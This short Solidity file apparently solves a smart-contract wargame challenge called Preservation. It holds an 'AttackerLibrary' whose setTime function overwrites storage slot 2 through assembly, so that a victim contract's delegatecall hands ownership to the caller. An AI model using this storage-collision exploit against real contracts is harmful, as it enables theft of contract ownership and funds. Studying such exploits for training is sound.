pragma solidity ^0.8.0;

contract AttackerLibrary {
    function setTime(uint256 _x) public {
        assembly {
            sstore(2, _x) // Overwrite owner (storage slot 2 in Preservation)
        }
    }
} 